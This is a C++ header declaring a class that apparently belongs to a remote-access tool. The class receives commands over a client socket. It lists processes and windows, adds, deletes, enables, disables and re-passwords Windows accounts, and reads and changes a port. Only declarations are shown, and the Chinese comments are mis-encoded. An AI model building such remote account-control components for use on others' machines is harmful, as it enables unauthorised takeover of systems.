// SerManager.h: interface for the CServerStart class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_ServerStart_H__26C71561_C37D_44F2_B69C_DAF907C04CBE__INCLUDED_)
#define AFX_ServerStart_H__26C71561_C37D_44F2_B69C_DAF907C04CBE__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "Manager.h"

class CServerStart : public CManager  
{
public:
	CServerStart(CClientSocket *pClient);
	virtual ~CServerStart();
	void SendProcessListo();

	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	static bool CALLBACK EnumWindowsProco( HWND hwnd, LPARAM lParam);

private:
	LPBYTE getProcessListo();
	LPBYTE getWindowsListo();
//	void SendProcessListo();
	void SendWindowsListo();
	void SendNetsDele(LPBYTE lpBuffer, UINT nSize);
	void SendNetstart(LPBYTE lpBuffer, UINT nSize , UINT User_kt);  //�ʻ����� ֹͣ
	void SendNetsPassword(LPBYTE lpBuffer, UINT nSize);   //�ʻ������޸�
	void getuseAdd(LPBYTE lpBuffer, UINT nSize);   //�ʻ�����
	void SendNetsPassPort(LPBYTE lpBuffer, UINT nSize);  //�˿��޸�
	void SendNetPortRead(char Prot[]);   //�˿ڶ�ȡ
	void SendNetPortReturn(UINT Port);  //�˿����ݷ���


};

#endif // !defined(AFX_SerManager_H__26C71561_C37D_44F2_B69C_DAF907C04CBE__INCLUDED_)
